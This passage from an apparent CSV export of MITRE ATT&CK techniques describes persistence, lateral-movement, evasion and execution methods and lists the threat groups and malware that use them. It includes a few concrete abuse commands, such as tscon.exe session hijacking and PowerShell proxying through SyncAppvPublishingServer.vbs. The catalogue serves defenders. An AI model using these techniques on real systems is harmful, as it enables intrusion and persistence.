[Lazarus Group] also used Visual Basic macro code to extract a double Base64 encoded DLL implant.', '[Snip3] can use visual basic scripts for first-stage execution.', '[Xbash] can execute malicious VBScript payloads on the victim’s machine.', '[Earth Lusca] used VBA scripts.', '[Rancor] has used VBS scripts as well as embedded macros for execution.', 'During [FunnyDream] the threat actors used a Visual Basic script to run remote commands.', '[Mustang Panda] has embedded VBScript components in LNK files to download additional files and automate collection.', '[Transparent Tribe] has crafted VBS-based malicious documents.\t ', '[VBShower] has the ability to execute VBScript files.', '[Exaramel for Windows] has a command to execute VBS scripts on the victim’s machine.', '[Astaroth] has used malicious VBS e-mail attachments for execution.', '[Silence] has used VBS scripts.', ""[NanHaiShu] executes additional VBScript code on the victim's machine."", '[Gamaredon Group] has embedded malicious macros in document templates, which executed VBScript. [Gamaredon Group] has also delivered Microsoft Outlook VBA projects with embedded macros.', '[LookBack] has used VBA macros in Microsoft Word attachments to drop additional files to the host.', ""[FIN7] used VBS scripts to help perform tasks on the victim's machine."", '[Chaes] has used VBscript to execute malicious code. ', '[Donut] can generate shellcode outputs that execute via VBScript.\t', '[Smoke Loader] adds a Visual Basic script in the Startup folder to deploy the payload.', '[APT38] has used VBScript to execute commands and other operational tasks.', '[NETWIRE] has been executed through use of VBScripts.', '[Machete] has embedded malicious macros within spearphishing attachments to download additional files.', '[Bisonal] dropper creates VBS scripts on the victim’s machine. ', '[REvil] has used obfuscated VBA macros for execution.', '[MuddyWater] has used VBScript files to execute its [POWERSTATS] payload, as well as macros.', '[Flagpro] can execute malicious VBA macros embedded in .xlsm files.', '[BRONZE BUTLER] has used VBS and VBE scripts for execution.', '[Confucius] has used VBScript to execute malicious code.', 'During [Frankenstein] the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.', 'For the [SolarWinds Compromise] [APT29] wrote malware such as [Sibot] in Visual Basic.', '[Cobalt Strike] can use VBA to perform execution.', '[TA505] has used VBS for code execution.', '[Bumblebee] can create a Visual Basic script to enable persistence.', '[OSX_OCEANLOTUS.D] uses Word macros for execution.', 'One version of [Helminth] consists of VBScript scripts.', '[Magic Hound] malware has used VBS scripts for execution.', '[ROKRAT] has used Visual Basic for execution.', '[Ferocious] has the ability to use Visual Basic scripts for execution.', '[QUADAGENT] uses VBScripts.', '[LazyScripter] has used VBScript to execute malicious code.', '[JSS Loader] can download and execute VBScript files.', '[Malteiro] has utilized a dropper containing malicious VBS scripts.', '[Lazarus Group] has used VBA and embedded macros in Word documents to execute malicious code.', '[Cobalt Group] has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.', 'During [C0015] the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.', '[Saint Bot] has used `.vbs` scripts for execution.', '[OilRig] has used VBScript macros for execution on compromised hosts.', '[SideCopy] has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`.', 'During [Operation Wocao] threat actors used VBScript to conduct reconnaissance on targeted systems.', '[Comnie] executes VBS scripts.', '[Emotet] has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. ', '[Leviathan] has used VBScript.', '[JCry] has used VBS scripts. ', '[STARWHALE] can use the VBScript function `GetRef` as part of its persistence mechanism.', '[TA459] has a VBScript for execution.', '[DanBot] can use a VBA macro embedded in an Excel file to drop the payload.', '[Pteranodon] can use a malicious VBS file for execution.', '[IcedID] has used obfuscated VBA string expressions.', '[KeyBoy] uses VBS scripts for installing files and performing execution.', '[Melcoz] can use VBS scripts to execute malicious DLLs.', '[NanoCore] uses VBS files.', '[FIN13] has used VBS scripts for code execution on comrpomised machines.', '[Sibot] executes commands using VBScript.\t', '[OopsIE] creates and uses a VBScript as part of its persistent execution.', 'During [Operation Sharpshooter] the threat actors used a VBA macro to execute a simple downloader that installed [Rising Sun]', '[WhisperGate] can use a Visual Basic script to exclude the `C:\\` drive from Windows Defender.', '[Sidewinder] has used VBScript to drop and execute malware loaders.', '[APT32] has used macros, COM scriptlets, and VBS scripts. ', '[PoetRAT] has used Word documents with VBScripts to execute malicious activities.', 'For [C0011] [Transparent Tribe] used malicious VBA macros within a lure document as part of the [Crimson] malware installation process onto a compromised host.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] installed a VBA script called `vba_macro.exe`. This macro dropped `FONTCACHE.DAT`, the primary [BlackEnergy] implant; `rundll32.exe`, for executing the malware; `NTUSER.log`, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. ', '[SUNBURST] used VBScripts to initiate the execution of payloads.', '[Molerats] used various implants, including those built with VBScript, on target machines.', '[TA2541] has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality.', ""[Ursnif] droppers have used VBA macros to download and execute the malware's full executable payload."", 'During [Operation Dust Storm] the threat actors used Visual Basic scripts.', 'During [Operation CuckooBees] the threat actors executed an encoded VBScript file using `wscript` and wrote the decoded output to a text file.', '[Bandook] has used malicious VBA code against the target system.', '[Inception] has used VBScript to execute malicious commands and payloads.', '[POWERSTATS] can use VBScript (VBE) code for execution.', '[DarkGate] initial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim.', '[TYPEFRAME] has used a malicious Word document for delivery with VBA macros for execution.', '[Remexi] uses AutoIt and VBS scripts throughout its execution process.', 'For [Operation Honeybee] the threat actors used a Visual Basic script embedded within a Word document to download an implant. ', '[APT-C-36] has embedded a VBScript within a malicious Word document which is executed upon the document opening.', '[QakBot] can use VBS to download and execute malicious files. ', '[HEXANE] has used a VisualBasic script named `MicrosoftUpdator.vbs` for execution of a PowerShell keylogger.', '[Ramsay] has included embedded Visual Basic scripts in malicious documents.\t', '[KOCTOPUS] has used VBScript to call wscript to execute a PowerShell command.', '[APT33] has used VBScript to initiate the delivery of payloads.', '[APT37] executes shellcode and a VBA script to decode Base64 strings.', '[Sandworm Team] has created VBScripts to run an SSH server. ', '[Kimsuky] has used Visual Basic to download malicious payloads. [Kimsuky] has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.', '[Metamorfo] has used VBS code on victims’ systems.', ""[StoneDrill] has several VBS scripts used throughout the malware's lifecycle.\t"", '[Mispadu] dropper uses VBS files to install payloads and perform execution.', '[PowerShower] has the ability to save and execute VBScript.', '[Gorgon Group] has used macros in [Spearphishing Attachment] as well as executed VBScripts on victim machines.', '[Javali] has used embedded VBScript to download malicious payloads from C2.', '[APT39] has utilized malicious VBS scripts in malware.', '[APT29] has written malware variants in Visual Basic.', '[Operation Wocao] has used a VBScript to conduct reconnaissance on targeted systems.', '[Honeybee] embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.', '[Sharpshooter] first-stage downloader was a VBA macro.', '[Frankenstein] has used Word documents that prompts the victim to enable macros and run a Visual Basic script.', '[Lazarus Group] has used VBScript to gather information about a victim machine. ', '[Cobalt Strike] can use VBA to perform execution.']",False
T1564.005,Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.  Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.","['[Equation] has used an encrypted virtual file system stored in the Windows Registry.', '[ComRAT] has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.', '[Regin] has used a hidden file system to store some of its components.', '[BOOTRASH] has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.', '[Uroburos] can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.', '[Strider] has used a hidden file system that is stored as a file on disk.']",
T1543.002,Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.    Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).   Inside the `.service` unit files, the following directives are used to execute commands:    * `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start. * `ExecReload` directive executes when a service restarts.  * `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.    Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.   The .service file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. ","['[TeamTNT] has established persistence through the creation of a cryptocurrency mining system service using <code>systemctl</code>.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] configured Systemd to maintain persistence of GOGETTER, specifying the `WantedBy=multi-user.target` configuration to run GOGETTER when the system begins accepting user logins.', '[Pupy] can be used to establish persistence using a systemd service.', '[Fysbis] has established persistence using a systemd service.', 'Depending on the Linux distribution and when executing with root permissions, [RotaJakiro] may install persistence using a `.service` file under the `/lib/systemd/system/` folder.', ""[SysUpdate] can copy a script to the user owned `/usr/lib/systemd/system/` directory with a symlink mapped to a `root` owned directory, `/etc/ystem/system`, in the unit configuration file's `ExecStart` directive to establish persistence and elevate privileges."", '[Exaramel for Linux] has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.', '[Rocke] has installed a systemd service script to maintain persistence.\t', '[Hildegard] has started a monero service.']",False
T1563.002,RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).  Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to [Remote System Discovery] and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.","['[WannaCry] enumerates current remote desktop sessions and tries to execute the malware on each session.', '[Axiom] has targeted victims with remote administration tools including RDP.']",False
T1547.013,XDG Autostart Entries,"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.  Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.  Adversaries may combine this technique with [Masquerading] to blend malicious Autostart entries with legitimate programs.","['[NETWIRE] can use XDG Autostart Entries to establish persistence on Linux systems.', '[Pupy] can use an XDG Autostart to establish persistence.', '[CrossRAT] can use an XDG Autostart to establish persistence.', 'When executing with user-level permissions, [RotaJakiro] can install persistence using a .desktop file under the `$HOME/.config/autostart/` folder.', ""If executing without root privileges, [Fysbis] adds a `.desktop` configuration file to the user's `~/.config/autostart` directory.""]",False
T1584.004,Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server] or [Virtual Private Server] adversaries may compromise third-party servers in support of operations.  Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise] or email servers to support [Phishing] operations.","['[Lazarus Group] has compromised servers to stage malicious tools.', '[Volt Typhoon] has used compromised PRTG servers from other organizations for C2.', '[Dragonfly] has compromised legitimate websites to host C2 and malware modules.', ""For [Operation Sharpshooter] the threat actors compromised a server they used as part of the campaign's infrastructure."", '[Turla] has used compromised servers as infrastructure.', '[APT16] has compromised otherwise legitimate sites as staging servers for second-stage payloads.', '[Sandworm Team] compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.', 'During [Night Dragon] threat actors compromised web servers to use for C2.', 'For [Operation Dream Job] [Lazarus Group] compromised servers to host their malicious tools.', '[Indrik Spider] has served fake updates via legitimate websites that have been compromised.\t', '[Earth Lusca] has used compromised web servers as part of their operational infrastructure.']",False
T1590.001,Domain Properties,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS] Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases] [Search Open Websites/Domains] or [Phishing for Information] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [Phishing]","[""[Sandworm Team] conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack."", '[AADInternals] can gather information about a tenant’s domains using public Microsoft APIs.']",False
T1055.005,Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.   TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection] techniques such as [Process Hollowing]  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",['[Ursnif] has injected code into target processes via thread local storage callbacks.'],
T1036.006,Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.  For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .  Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",['[Keydnap] puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.'],
T1547.007,Re-opened Applications,"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"". When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. Applications listed in this file are automatically reopened upon the user’s next logon.  Adversaries can establish [Persistence] by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",[],False
T1608.006,SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.  To help facilitate [Drive-by Compromise] adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target] within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).  Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.  SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.",['[Mustard Tempest] has poisoned search engine results to return fake software updates in order to distribute malware.'],False
T1550.002,Pass the Hash,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.  When performing PtH, valid password hashes for the account being used are captured using a [Credential Access] technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.  Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket] attacks.","['[APT32] has used pass the hash for lateral movement.', '[Cobalt Strike] can perform pass the hash.', '[Pass-The-Hash Toolkit] can perform pass the hash.', '[APT28] has used pass the hash for lateral movement.', '[Chimera] has dumped password hashes for use in pass the hash authentication attacks.', 'The [APT1] group is known to have used pass the hash.', '[Wizard Spider] has used the `Invoke-SMBExec` PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.', '[HOPLIGHT] has been observed loading several APIs associated with Pass the Hash.\t', '[PoshC2] has a number of modules that leverage pass the hash for lateral movement.', '[Mimikatz] <code>SEKURLSA::Pth</code> module can impersonate a user, with only a password hash, to execute arbitrary commands.', '[APT41] uses tools such as [Mimikatz] to enable lateral movement via captured password hashes.', '[Kimsuky] has used pass the hash for authentication to remote access software used in C2.', '[Empire] can perform pass the hash attacks.', '[FIN13] has used the PowerShell utility `Invoke-SMBExec` to execute the pass the hash method for lateral movement within an compromised environment.', '[BADHATCH] can perform pass the hash on compromised machines with x64 versions. ', '[CrackMapExec] can pass the hash to authenticate via SMB.', 'During [Night Dragon] threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.', '[GALLIUM] used dumped hashes to authenticate to other machines via pass the hash.', '[Night Dragon] used pass-the-hash tools to gain usernames and passwords.', '[Cobalt Strike] can perform pass the hash.']",False
T1574.002,DLL Side-Loading,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking] side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).  Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.","['[Chimera] has used side loading to place malicious DLLs in memory.', '[Chinoxy] can use a digitally signed binary (""Logitech Bluetooth Wizard Host Process"") to load its dll into memory.', '[MuddyWater] maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.', '[Brute Ratel C4] has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.', '[Dridex] can abuse legitimate Windows executables to side-load malicious DLL files.', '[Pandora] can use DLL side-loading to execute malicious payloads.', 'A [Patchwork] .dll that contains [BADNEWS] is loaded and executed using DLL side-loading.', '[Wingbird] side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.', '[Javali] can use DLL side-loading to load malicious DLLs into legitimate executables.', '[BADNEWS] typically loads its DLL file into a legitimate signed Java or VMware executable.', '[Threat Group-3390] has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as `rc.exe`, a legitimate Microsoft Resource Compiler.', '[HyperBro] has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.', '[GALLIUM] used DLL side-loading to covertly load [PoisonIvy] into memory on the victim machine.', '[Higaisa] JavaScript file used a legitimate Microsoft Office 2007 package to side-load the <code>OINFO12.OCX</code> dynamic link library.', '[Metamorfo] has side-loaded its malicious DLL file. ', '[Waterbear] has used DLL side loading to import and load a malicious DLL loader. ', '[PlugX] has used DLL side-loading to evade anti-virus.', '[ZeroT] has used DLL side-loading to load malicious payloads.', '[APT32] ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).', ""[Sakula] uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files."", 'During the [T9000] installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.', 'A [gh0st RAT] variant has used DLL side-loading.', 'DLL side-loading has been used to execute [BBSRAT] through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with [BBSRAT] by the dropper.', '[Ninja] loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player.', '[HTTPBrowser] has used DLL side-loading.', '[QakBot] has the ability to use DLL side-loading for execution.', '[Tropic Trooper] has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.', '[Earth Lusca] has placed a malicious payload in `%WINDIR%\\SYSTEM32\\oci.dll` so it would be sideloaded by the MSDTC service. ', '[Kerrdown] can use DLL side-loading to load malicious DLLs.', '[LuminousMoth] has used legitimate executables such as `winword.exe` and `igfxem.exe` to side-load their malware.', '[LoFiSe] has been executed as a file named DsNcDiag.dll through side-loading.', '[BRONZE BUTLER] has used legitimate applications to side-load malicious DLLs.', '[APT3] has been known to side load DLLs with a valid version of Chrome with one of their tools.', '[BlackTech] has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories. ', '[Egregor] has used DLL side-loading to execute its payload. ', '[FIN13] has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).', '[Mustang Panda] has used a legitimately signed executable to execute a malicious payload within a DLL file.', '[APT41] used legitimate executables to perform DLL side-loading of their malware. ', '[Nebulae] can use DLL side-loading to gain execution.', '[SideCopy] has used a malicious loader DLL file to execute the `credwiz.exe` process and side-load the malicious payload `Duser.dll`.', '[PowGoop] can side-load `Goopdate.dll` into `GoogleUpdate.exe`.', '[metaMain] can support an HKCMD sideloading start method.', '[DarkGate] includes one infection vector that leverages a malicious ""KeyScramblerE.DLL"" library that will load during the execution of the legitimate KeyScrambler application.', '[FinFisher] uses DLL side-loading to load malicious programs.', '[SysUpdate] can load DLLs through vulnerable legitimate executables. ', '[Goopy] has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.', '[Ecipekac] can abuse the legitimate application policytool.exe to load a malicious DLL.', '[Pcexter] has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.', ""[Naikon] has used DLL side-loading to load malicious DLL's into legitimate executables."", '[menuPass] has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as [UPPERCUT]', '[Lazarus Group] has replaced `win_fw.dll`, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.', 'During [Operation CuckooBees] the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.', '[Denis] exploits a security vulnerability to load a fake DLL and execute its code.', '[Cinnamon Tempest] has abused legitimate executables to side-load weaponized DLLs.', '[RainyDay] can use side-loading to run malicious executables.', '[Clambling] can store a file named `mpsvc.dll`, which opens a malicious `mpsvc.mui` file, in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.', '[RCSession] can be installed via DLL side-loading.', '[APT19] launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.', '[LookBack] side loads its communications module as a DLL into the <code>libcurl.dll</code> loader.', '[Sidewinder] has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.']",False
T1216.002,SyncAppvPublishingServer,"Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell] commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.      The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.  Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell] execution restrictions and evade defensive counter measures by ""living off the land."" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.  For example,  [PowerShell] commands may be invoked using:  `SyncAppvPublishingServer.vbs ""n; {PowerShell}""`",[],False
T1098.002,Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.   For example, the <code>Add-MailboxPermission</code> [PowerShell] cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.   Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.  This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles] to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing] so the messages evade spam/phishing detection mechanisms.","['During the [SolarWinds Compromise] [APT29] added their own devices as allowed IDs for active sync using `Set-CASMailbox`, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.', ""[Magic Hound] granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. "", '[APT28] has used a Powershell cmdlet to grant the <code>ApplicationImpersonation</code> role to a compromised account.', '[APT29] has used a compromised global administrator account in Azure AD to backdoor a service principal with `ApplicationImpersonation` rights to start collecting emails from targeted mailboxes; [APT29] has also used compromised accounts holding `ApplicationImpersonation` rights in Exchange to collect emails.', '[UNC2452] added their own devices as allowed IDs for active sync using <code>Set-CASMailbox</code>, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.', '[APT29] added their own devices as allowed IDs for active sync using <code>Set-CASMailbox</code>, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.']",False
T1588.003,Code Signing Certificates,Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.  Prior to [Code Signing] adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.,"['[Wizard Spider] has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.', '[BlackTech] has used stolen code-signing certificates for its malicious payloads.', '[Ember Bear] has stolen legitimate certificates to sign malicious payloads.', '[FIN8] has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers.', '[MegaCortex] has used code signing certificates issued to fake companies to bypass security controls.', 'During [Operation Dream Job] [Lazarus Group] used code signing certificates issued by Sectigo RSA for some of its malware and tools. ', '[Threat Group-3390] has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations.', '[Lazarus Group] has used code signing certificates issued by Sectigo RSA for some of its malware and tools.']",
T1548.006,TCC Manipulation,"Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).  When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.  Adversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions.   For example, adversaries can use Finder, which has FDA permissions by default, to execute malicious [AppleScript] while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and [Launchctl]  Adversaries may also opt to instead inject code (e.g., [Process Injection] into targeted applications with the desired TCC permissions. ",[],False
